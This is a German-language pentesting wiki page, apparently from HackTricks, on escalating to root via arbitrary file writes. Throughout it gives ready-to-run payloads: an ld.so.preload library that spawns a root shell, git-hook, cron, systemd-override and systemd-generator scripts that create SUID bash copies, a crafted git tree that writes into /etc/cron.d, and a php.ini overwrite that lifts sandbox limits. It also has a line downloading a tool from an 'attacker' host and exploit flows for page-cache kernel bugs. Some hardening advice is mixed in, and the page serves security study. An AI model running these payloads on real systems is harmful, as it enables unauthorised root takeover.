# Beliebiges Schreiben von Dateien als Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ist eine systemweite Liste gemeinsam genutzter Objekte, die der dynamische Linker vor anderen gemeinsam genutzten Objekten lädt. Der Sicherheitsausführungsmodus schränkt das Vorladen zusätzlich ein, daher ist ein Bibliothekspfad wie `/tmp/pe.so` keine universell einsetzbare SUID-Binary-Technik.\
Wenn du die Datei erstellen oder ändern kannst, lädt ein Prozess, der die Datei einliest, die dort aufgeführte Bibliothek vor seinen anderen gemeinsam genutzten Objekten und ermöglicht so die Codeausführung im Kontext dieses Prozesses.<sup>[[12]](#references)</sup>

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### OCR-Ausgabe als eingeschränkter Dateischreibzugriff

Ein OCR-Dienst, bei dem der Aufrufer den Namen der gespeicherten Datei wählen kann, kann erkannten Bildtext in einen **eingeschränkten Dateischreibzugriff** umwandeln. Die gespeicherten Bytes enthalten den erkannten Text, nicht die Bilddaten. Prüfe daher die OCR-Ausgabe auf Syntaxfehler. Wenn das zulässige Zielverzeichnis webausführbar ist und einen `.php`-Dateinamen erlaubt, kann der Text bei einem Aufruf ausgeführt werden. Bei MakeSense speicherte eine lokal erreichbare OCR-Anwendung den Text unter `/saved/`; ihr als root laufender PHP-Server führte die gespeicherte Datei dann als root aus. Der Schreibzugriff war auf dieses Verzeichnis beschränkt; ein Path Traversal wurde nicht nachgewiesen.<sup>[[37]](#references)</sup>

Die bei der Ausführung erlangten Berechtigungen entsprechen denen des **PHP-Serving-Prozesses** und nicht automatisch denen des OCR-Schreibers. Prüfe die Ausführungszuordnung des Ziels und die Identität zur Laufzeit. Ein als root laufender OCR-Schreiber würde nicht dazu führen, dass PHP als root ausgeführt wird, wenn der Webserver unprivilegiert läuft.<sup>[[37]](#references)</sup> Vergleiche das direkte [Upload-Muster ins Web-Root](../../pentesting-web/file-upload/).

### Git hooks

**Git hooks** sind ausführbare Skripte, die bei Ereignissen in einem Repository ausgeführt werden, darunter commit- und merge-Vorgänge. Wenn ein **privilegiertes Skript oder ein privilegierter Benutzer** diese Aktionen ausführt und ein Angreifer **Schreibzugriff auf den Ordner `.git`** hat, kann der Hook zur **Privilege Escalation** verwendet werden.<sup>[[13]](#references)</sup>

Zum Beispiel kann in einem Git-Repository ein **Skript erstellt** werden, das unter **`.git/hooks`** abgelegt wird, sodass es bei jedem neuen Commit ausgeführt wird:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privilegierter Git-Tree-Export: Path Traversal

Ein privilegierter Synchronisierer kann auf einen Checkout verzichten und stattdessen ein vom Angreifer beeinflusstes Repository mit `git ls-tree` auflisten, jeden Blob mit `git cat-file` lesen, den gemeldeten Pfad mit einem Staging-Verzeichnis verknüpfen und die Datei selbst schreiben. Das wird zu einem **arbitrary file write mit den Berechtigungen des Synchronisierers**, wenn `-c safe.directory=*` (das die Git-Schutzmaßnahme für Repositories mit anderem Besitzer deaktiviert) mit einer fehlenden Prüfung der Zielpfadbegrenzung kombiniert wird. Ein absoluter Tree-Eintrag bewirkt, dass Python bei `os.path.join(stage, name)` `stage` verwirft; ein relativer Pfad mit `../` entkommt dem Verzeichnis, sobald das Dateisystem ihn auflöst. Da die Anwendung den rohen Tree materialisiert, statt Git mit dem Checkout zu beauftragen, schützt die Pfadnamenprüfung beim Checkout das Ziel nicht.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Achte in Root-Diensten, Timern, Deployment-Agenten, Template-Importern und Backup-/Restore-Jobs auf diese Code-Struktur:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Ein Tree-Eintrag ist als `<mode> SP <name> NUL <raw object ID>` kodiert. Die Option `git hash-object --literally` erlaubt bewusst Objektdaten, die beim normalen Parsen oder von `git fsck` abgelehnt werden können. Daher kann ein Wegwerf-Clone einen Tree erstellen, dessen Dateiname ein absolutes Ziel ist. Dieses Beispiel erstellt einen Blob für eine Cron-Datei, verpackt den manipulierten Tree in einen Commit und verschiebt einen Branch darauf. Für die Ausnutzung sind weiterhin die Berechtigung erforderlich, ein Repository zu aktualisieren, das vom privilegierten Job verwendet wird, sowie ein Git-Server, der das fehlerhafte Objekt akzeptiert.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Die Absicherung muss sowohl die Repository-Aufnahme als auch den abschließenden Dateisystemvorgang umfassen:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Ersetze `safe.directory=*` durch die exakten Repositories, denen der Dienst vertrauen muss, und führe die Repository-Verarbeitung nach Möglichkeit ohne Root-Rechte aus.
- Weise absolute Namen sowie alle `.`- oder `..`-Komponenten vor der Materialisierung zurück. Kanonisiere das Ziel nach dem Zusammenfügen und überprüfe, dass es innerhalb des vorgesehenen Stammverzeichnisses bleibt.
- Vermeide Symlink-Races durch „Prüfen und dann öffnen“: Öffne relativ zu einem vertrauenswürdigen Verzeichnis-Deskriptor und verwende unter Linux für vom Angreifer kontrollierte Pfade `openat2()` mit `RESOLVE_BENEATH` und `RESOLVE_NO_SYMLINKS`.
- Bevorzuge einen normalen Checkout in einem isolierten Verzeichnis gegenüber einer eigenen Implementierung des Checkouts anhand von Plumbing-Ausgaben. Wenn die Aufnahme roher Objekte erforderlich ist, aktiviere eine Validierung auf der Empfangsseite, etwa mit `receive.fsckObjects=true`; setze die pathname-bezogenen `receive.fsck.*`-Befunde, die zum Zurückweisen manipulierter Trees benötigt werden, nicht herab.

### Bereitstellung privilegierter Konfiguration

Manche Verwaltungsdienste speichern den vorgesehenen Systemzustand in einer Konfigurationsdatei und stellen ihn später mit erhöhten Privilegien bereit. Beispielsweise speichert [openmediavault die Konfiguration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), und über seine [RPC-Schnittstelle](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) lassen sich Dienständerungen anwenden. Wenn ein Konto mit niedrigeren Privilegien diese Datei schreiben oder ersetzen kann, prüfe, ob es auch eine autorisierte Bereitstellung anfordern kann und ob das ausgewählte Modul das geänderte Feld als root verarbeitet. Für SSH-Kontoschlüssel, geplante Befehle und Paketinstallationen gelten jeweils unterschiedliche Voraussetzungen; das bloße Vorhandensein einer Datei oder eine beschreibbare XML-Datei beweist keines davon. Prüfe die Datei- und übergeordneten Verzeichnisberechtigungen, die Gruppen des Aufrufers und seine RPC-Autorisierung, die installierte Version sowie die tatsächliche verarbeitende Komponente, ohne die Konfiguration während der Bestandsaufnahme zu bearbeiten oder einen Anwendungsvorgang auszulösen.

Fail2Ban-Aktionsdefinitionen unter `/etc/fail2ban/action.d/` bilden eine weitere Grenze für privilegierte Konfiguration. Ein Benutzer, der in dieses Verzeichnis schreiben und es durchsuchen kann, kann möglicherweise eine Aktionsdefinition ersetzen oder eine Überschreibung hinzufügen. Die Verzeichnisberechtigungen allein belegen jedoch keine Codeausführung. Stelle fest, ob ein aktiviertes Jail tatsächlich die betroffene Aktion auswählt, ob der Fail2Ban-Dienst sie mit höheren Privilegien ausführt und ob ein autorisierter Reload/Neustart sowie ein passendes Ban-Ereignis stattfinden werden. Eine nicht damit zusammenhängende sudo-Berechtigung zum Neustart von Fail2Ban ist nur dann relevant, wenn sie für genau diesen Dienstaufruf gilt und die geänderte Definition geladen wird. [Die Aktionskonfiguration von Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) dokumentiert den Zusammenhang zwischen Aktionsverzeichnis und Jail; die [Beispielaktion](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) zeigt, dass `actionban` bei einem Ban mit den Rechten des Dienstbenutzers ausgeführt wird. Prüfe Berechtigungen und wirksame Konfiguration, ohne Aktionen zu ändern oder während der Bestandsaufnahme Bans auszulösen.

Eine separate Grenze besteht, wenn ein aktiviertes Fail2Ban-Jail eine WHOIS-angereicherte Mail-Aktion verwendet. Bei [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) wurden nicht vertrauenswürdige WHOIS-Texte an GNU mailutils `mail` weitergeleitet, dessen Escape-Verarbeitung einen Befehl ausführen konnte. Ein Benutzer mit niedrigeren Privilegien, der Dateien schreiben kann, könnte die Antwort beeinflussen, wenn er die Server-Override-Konfiguration des **ausgewählten WHOIS-Clients** ändern kann; [Debians `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) dokumentiert eine solche Datei, doch Pfad und Verwendung variieren je nach Installation. Prüfe das wirksame Jail und die Aktion, die Dienstidentität, den tatsächlichen WHOIS-Client und Konfigurationspfad, die Mail-Implementierung, die Kontrolle über die Antwort sowie den installierten Hersteller-Fix oder Backport. Eine beschreibbare WHOIS-Konfigurationsdatei, eine Fail2Ban-Version oder eine Mail-Aktion allein belegt diese Angriffskette nicht; vermeide bei einer passiven Bestandsaufnahme Abfragen an externe Server und das Auslösen von Bans.

### TFTP-Dateierstellung und privilegierte Paket-Hooks

Ein zugänglicher TFTP-Dienst kann eine Container- oder lokalen Benutzergrenze überwinden, wenn seine **wirksamen** tftpd-hpa-Einstellungen ihn als root ausführen, das Dateisystem-Root als `--secure`-Verzeichnis bereitstellen und `--create` aktivieren. [Das tftpd-hpa-Handbuch](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) beschreibt die Optionen zur Dateierstellung und Benutzerauswahl. Damit kommt die Erstellung einer neuen Datei in einem privilegierten Konfigurationsverzeichnis infrage, einschließlich `/etc/apt/apt.conf.d/`; eine vorhandene Datei lässt sich möglicherweise trotzdem nicht ersetzen. [Das APT-Konfigurationshandbuch](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) dokumentiert `APT::Update::Pre-Invoke`-Befehle. Ein als root ausgeführtes `apt update` kann zum Verbraucher mit höheren Privilegien werden, **aber nur, wenn** es die neue Konfigurationsdatei einliest. Prüfe die tatsächlichen Argumente und die Identität des laufenden Daemons, Netzwerk-Erreichbarkeit und Filterung, die Erstellungsrichtlinien des Zielverzeichnisses, den wirksamen Konfigurationsumfang von APT sowie einen späteren privilegierten Aufruf. Eine Standarddatei, ein beschreibbares Zielverzeichnis oder ein geplanter APT-Befehl allein belegt nicht den gesamten Angriffsweg. Bei einer passiven Triage sollten nur begrenzte lokale Konfigurationen und Metadaten gelesen werden, ohne eine Datei hochzuladen oder APT aufzurufen.

### Cron- und Zeitdateien

Wenn du **Cron-bezogene Dateien schreiben kannst, die root ausführt**, kannst du in der Regel beim nächsten Lauf des Jobs Code ausführen. Interessante Ziele sind:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Die Crontab von root unter `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen ausgelösten Dienste

Schnellprüfungen:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typische Missbrauchswege:

- **Einen neuen root-Cronjob anfügen** in `/etc/crontab` oder einer Datei in `/etc/cron.d/`
- **Ein Skript ersetzen**, das bereits von `run-parts` ausgeführt wird
- **Ein bestehendes Timer-Ziel mit einer Backdoor versehen**, indem das Skript oder die Binärdatei geändert wird, die es startet

Minimales Beispiel für eine Cron-Payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Wenn du nur in ein von `run-parts` verwendetes Cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Hinweise:

- `run-parts` ignoriert normalerweise Dateinamen mit Punkten. Verwende daher lieber Namen wie `backup` statt `backup.sh`.<sup>[[15]](#references)</sup>
- Manche Systeme verwenden `systemd`-Timer statt klassischem cron, aber die Idee des Missbrauchs ist dieselbe: **ändern, was root später ausführen wird**.<sup>[[20]](#references)</sup>

### Service- und Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder von ihnen referenzierte Dateien beschreiben kannst, kannst du möglicherweise Code als root ausführen, indem du die Unit neu lädst und neu startest oder darauf wartest, dass die Service-/Socket-Aktivierung ausgelöst wird.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Prüfe auch den Schreib- und Suchzugriff auf das System-Unit-Verzeichnis selbst, einschließlich ACLs: Ein Benutzer kann eine neue Unit unter `/etc/systemd/system` erstellen, selbst wenn das Lesen oder Auflisten des Verzeichnisses verweigert wird. Dieser Pfad allein startet jedoch nichts. Stelle sicher, dass der Systemmanager die neue Unit lädt, dass der aufrufende Benutzer für ihren Namen eine effektive root-fähige Berechtigung für `systemctl start` oder `restart` hat (oder ein anderer privilegierter Aktivierungspfad verfügbar ist) und dass der Service unter der vorgesehenen Identität ausgeführt wird. Bei einer bestehenden, geladenen Unit, die auf der Festplatte geändert wurde, ist möglicherweise `daemon-reload` erforderlich; für eine neu benannte Unit gelten andere Ladeverfahren. Prüfe die genauen sudo-Argumente und Ausschlüsse, bevor du eine Wildcard-Regel für `restart` als ausreichend einstufst. Siehe den [systemd-Unit-Suchpfad](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) und die [Lade- und Reload-Semantik von systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Interessante Ziele sind unter anderem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Overrides unter `/etc/systemd/system/<unit>.d/*.conf`
- Service-Skripte/Binärdateien, auf die `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verweisen
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnellprüfungen:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Häufige Missbrauchswege:

- **`ExecStart=` überschreiben** in einer root-eigenen Service-Unit, die du bearbeiten kannst
- **Ein Drop-in-Override hinzufügen** mit einem bösartigen `ExecStart=` und den alten Eintrag zuerst löschen
- **Das Skript/Programm manipulieren**, auf das die Unit bereits verweist
- **Einen socket-aktivierten Service kapern**, indem du die zugehörige `.service`-Datei änderst, die gestartet wird, wenn der Socket eine Verbindung empfängt

Beispiel für ein bösartiges Override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Typischer Aktivierungsablauf:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Wenn du Services nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten kannst, musst du möglicherweise nur **auf eine Client-Verbindung warten**, um die Ausführung des mit einer Backdoor versehenen Services als root auszulösen.<sup>[[17]](#references)</sup>

### systemd-Generator-Verzeichnisse

**Systemgeneratoren** sind ausführbare Dateien, die vom Systemmanager gestartet werden, bevor er Unit-Dateien lädt – sowohl beim Booten als auch beim Neuladen der Konfiguration. Schreibzugriff auf ein Systemgenerator-Verzeichnis (oder auf einen vorhandenen ausführbaren Generator) ermöglicht daher direkt Root-Code-Ausführung. Das wird leicht übersehen, wenn bei einem Audit nur `*.service`- und `*.timer`-Dateien geprüft werden.<sup>[[35]](#references)[[36]](#references)</sup>

Die übliche Suchreihenfolge ist `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` und `/usr/lib/systemd/system-generators/` (manche Distributionen stellen `/lib/systemd/system-generators/` über die Zusammenführung mit `/usr` bereit). Eine ausführbare Datei mit demselben Namen in einem früheren Verzeichnis überschattet die Datei im späteren Verzeichnis. Verwechsle diese **Verzeichnisse für ausführbare Eingabedateien** nicht mit `/run/systemd/generator`, `/run/systemd/generator.early` und `/run/systemd/generator.late`, die temporäre Unit-Ausgaben enthalten, die von Generatoren erzeugt wurden.<sup>[[35]](#references)</sup>

Schnelle Prüfungen:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Ein neu erstellter Generator muss das Ausführungsbit gesetzt haben. Wenn die Schreibprimitive Bytes, aber nicht den Modus kontrolliert, ziele auf einen bereits ausführbaren Generator; wenn du ihn direkt kürzt, bleiben seine Metadaten normalerweise erhalten. Ist das Verzeichnis selbst beschreibbar, erstelle einen neuen Eintrag und markiere ihn als ausführbar.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Das Ausführen von `systemctl daemon-reload` für den **system**-Manager erfordert eine entsprechende Autorisierung, führt aber alle System-Generatoren erneut aus. Andernfalls musst du auf einen Reload mit privilegierten Rechten, einen Paketvorgang oder einen Neustart warten. User-Generator-Verzeichnisse wie `~/.config/systemd/user-generators/` werden unter dem User-Manager ausgeführt und gewähren **für sich genommen keinen** Root-Zugriff.<sup>[[35]](#references)</sup>

Prüfe zur Absicherung und Suche nach verdächtigen Aktivitäten jede Pfadkomponente und ACL, statt nur die abschließenden Modus-Bits zu prüfen. Erfasse Hashes und Paketzugehörigkeit der Generatoren als Baseline und richte Warnungen für Erstellungs-, Umbenennungs-, Inhalts- oder Berechtigungsänderungen in allen System-Generator-Eingabeverzeichnissen ein. Die Überwachung von Schreibvorgängen ist wichtig, da ein einmaliger Generator sich nach der Ausführung selbst löschen kann, während der generierte Unit-Baum unter `/run/systemd/generator*` beim nächsten Reload neu erstellt wird.<sup>[[35]](#references)[[36]](#references)</sup>

### Eine restriktive `php.ini` überschreiben, die von einer privilegierten PHP-Sandbox verwendet wird

Manche benutzerdefinierten Daemons prüfen von Benutzern bereitgestellten PHP-Code, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel mit `disable_functions=exec,system,...`). Wenn der Code in der Sandbox noch **irgendeine Schreibprimitive** (wie `file_put_contents`) enthält und du den **exakten `php.ini`-Pfad** erreichen kannst, den der Daemon verwendet, kannst du **diese Konfiguration überschreiben**, um die Einschränkungen aufzuheben, und anschließend einen zweiten Payload übermitteln, der mit erweiterten Privilegien ausgeführt wird.<sup>[[2]](#references)</sup>

Typischer Ablauf:

1. Der erste Payload überschreibt die Sandbox-Konfiguration.
2. Der zweite Payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (ersetze den vom Daemon verwendeten Pfad):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Wenn der Daemon als root läuft (oder Pfade mit root-Eigentümer validiert), ergibt die zweite Ausführung einen root-Kontext. Das ist im Wesentlichen eine **Privilege Escalation durch Überschreiben der Konfiguration**, wenn die sandboxed runtime weiterhin Dateien schreiben kann.

### binfmt_misc

`binfmt_misc` stellt Registrierungen unter `/proc/sys/fs/binfmt_misc` bereit; jede Registrierung ordnet einem Dateitypmuster einen Interpreter zu. Die Auswirkungen auf Privilegien hängen davon ab, wer die Registrierung ändern kann und welcher Prozess später die passende Datei ausführt. Überprüfe diese Voraussetzungen, bevor du dies als möglichen Privilege-Escalation-Pfad einstufst.<sup>[[21]](#references)</sup>

Ein ausführbarer Helper mit `CAP_DAC_OVERRIDE` kann einen separaten Registrierungsweg eröffnen, wenn er vom Aufrufer kontrollierte Daten entgegennimmt und sie nach `/proc/sys/fs/binfmt_misc/register` schreibt, selbst wenn der Aufrufer diesen Knoten nicht direkt beschreiben kann. Überprüfe die Eingabe- und Schreibvorgänge des Helpers, ohne ihn während der Enumeration auszuführen. Verwendet eine registrierte Regel das Flag `C`, erhält der Interpreter Credentials auf Grundlage der passenden Binärdatei; eine passende, root-eigene SUID-Datei kann daher einen vom Aufrufer kontrollierten Interpreter als root ausführen. Überprüfe den `binfmt_misc`-Mount und die Registrierungsrichtlinie, die effektiven Capabilities des Helpers, die genaue Regel und den Interpreter-Pfad, das ausführbare SUID-Ziel sowie, ob `no_new_privs` oder ein `nosuid`-Mount den SUID-Übergang unterbindet. Ein Capability-Bit oder ein eingebetteter Pfad allein ist lediglich ein Hinweis für die Überprüfung.<sup>[[21]](#references)</sup> Siehe [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) zu Bedingungen, unter denen SUID unterbunden wird.

### Schema-Handler überschreiben (wie http: oder https:)

Desktop-Umgebungen verwenden MIME-Zuordnungen und Desktop-Einträge, um eine Anwendung für URI-Schemas auszuwählen. Ein Angreifer, der die relevanten benutzerspezifischen Konfigurations- und Desktop-Eintragsverzeichnisse beschreiben kann, kann diese Schemas zu einem von ihm kontrollierten Launcher umleiten. Durch Ändern der Datei `$HOME/.config/mimeapps.list`, sodass HTTP- und HTTPS-URL-Handler auf eine bösartige Datei verweisen (zum Beispiel `x-scheme-handler/http=evil.desktop` und `x-scheme-handler/https=evil.desktop`), kann ein Klick des Benutzers diesen Desktop-Eintrag aufrufen.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root führt benutzerschreibbare Skripte/Binärdateien aus

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` (oder eine beliebige Binärdatei in einem Verzeichnis ausführt, das einem unprivilegierten Benutzer gehört), kannst du ihn hijacken:<sup>[[1]](#references)</sup>

- **Ausführung erkennen:** Überwache Prozesse mit pspy, um Root beim Aufruf benutzergesteuerter Pfade zu erkennen.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören und für ihn beschreibbar sind.
- **Ziel hijacken:** Sichere die ursprüngliche Binärdatei/das ursprüngliche Script und lege eine Payload ab, die eine SUID-Shell erstellt (oder eine andere Root-Aktion ausführt), und stelle anschließend die Berechtigungen wieder her:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Die privilegierte Aktion auslösen** (z. B. einen UI-Button drücken, der den Helper startet). Wenn root den hijackten Pfad erneut ausführt, die eskalierte Shell mit `./rootshell -p` übernehmen.

### Dateiänderung nur im Page Cache privilegierter Binärdateien

Manche Kernel-Bugs ändern die Datei **auf der Festplatte** nicht. Stattdessen ermöglichen sie Änderungen ausschließlich an der **Page-Cache-Kopie** einer lesbaren Datei. Wenn du ein **setuid**- oder anderweitig von **root ausgeführtes** Binary als Ziel verwenden kannst, kann bei der nächsten Ausführung attacker-kontrollierter Code aus dem Speicher laufen und Privilegien eskalieren, obwohl sich der Datei-Hash auf der Festplatte nicht geändert hat.<sup>[[3]](#references)[[4]](#references)</sup>

Diese Technik lässt sich als **Laufzeit-Dateischreibprimitive** verstehen:<sup>[[3]](#references)</sup>

- **Die Festplatte bleibt sauber**: Der Inode und die Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Page lesen oder ausführen, erhalten den vom Angreifer geänderten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder der Verdrängung aus dem Cache

Diese Primitive liegt zwischen klassischem **arbitrary file write** und älteren **Page-Cache-Missbrauchs**-Bugs wie Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW beruhte auf einer Race Condition
- Dirty Pipe hatte Einschränkungen bei der Schreibposition
- Eine Page-Cache-only-Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibvorgänge in gecachte, dateigestützte Pages ermöglicht

#### Generischer Privesc-Ablauf

1. Eine Kernel-Primitive beschaffen, die in **dateigestützte Page-Cache-Pages** schreiben kann
2. Sie gegen ein **lesbares privilegiertes Binary** oder eine andere von root ausgeführte Datei einsetzen
3. Die Ausführung auslösen, **bevor** die Page aus dem Cache verdrängt wird
4. Codeausführung als root erlangen, während die Datei auf der Festplatte unverändert aussieht

Typische hochwertige Ziele:

- **setuid-root**-Binaries
- Helper, die von **root-Services** gestartet werden
- Binaries, die häufig aus **Containern mit gemeinsam genutztem Host-Kernel/Page Cache** ausgeführt werden

#### Beispielpfad mit AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad lag in der Linux-Crypto-Userspace-API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kann Referenzen auf Page-Cache-Pages aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- Der In-Place-`algif_aead`-Decrypt-Pfad verwendete Quell- und Zielpuffer erneut
- `authencesn` schrieb anschließend in den Ziel-Tag-Bereich
- Wenn dieser Bereich weiterhin auf gesplicte, dateigestützte Pages verwies, landete der Schreibvorgang im **Page Cache der Zieldatei**

Die interessante Technik ist also nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Pages in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als **beschreibbare Ausgabe** zu behandeln
- eine kleine, kontrollierte Überschreibung im Speicher auslösen

Der öffentliche PoC verwendete wiederholte **4-Byte-Schreibvorgänge**, um `/usr/bin/su` im Speicher zu patchen und dann auszuführen.<sup>[[4]](#references)[[7]](#references)</sup>

#### Beispielpfad mit ESP / XFRM + Netfilter-TEE-Klon

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben **Page-Cache-only-write-to-root**-Musters, diesmal jedoch mit **IPsec-ESP-Decrypt** statt `AF_ALG` als Senke.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die entscheidende Technik ist der **Metadata-Laundering-Schritt**:

- `splice()` platziert eine **schreibgeschützte, dateigestützte Page-Cache-Page** in einem ESP-in-UDP-Paket
- Die ursprüngliche DirtyFrag-Mitigation markierte das skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` vor dem Decrypt **eine Kopie erstellt**
- Netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Der Klon behält dieselbe **physische Page-Cache-Referenz**, verliert aber `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Klon daraufhin als sicher und führt **In-Place-`cbc(aes)`-Decrypt** auf der dateigestützten Page aus

Die Lehre für Reviewer geht über die CVE hinaus: Wenn eine Mitigation anhand von **skb/Page-Metadaten** entscheidet, ob eine Operation zuerst kopieren muss, kann jeder **Klon-/Kopierpfad, der die zugrunde liegende Page beibehält, aber die Metadaten verwirft**, die Schreibprimitive unbemerkt wieder eröffnen.

Typischer Exploit-Ablauf:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ausführen, um **`CAP_NET_ADMIN` innerhalb eines privaten Network Namespace** zu erhalten
2. Loopback aktivieren und eine **Netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. **XFRM-ESP-Transport-SAs** über `NETLINK_XFRM` installieren
4. Jedes 4-Byte-Zielwort im SA-Feld `seq_hi` codieren (DirtyFrags Trick zur Wortauswahl)
5. Das gesplicte ESP-in-UDP-Paket senden, sodass der **TEE-Klon** `esp_input()` erreicht und **In-Place** entschlüsselt wird
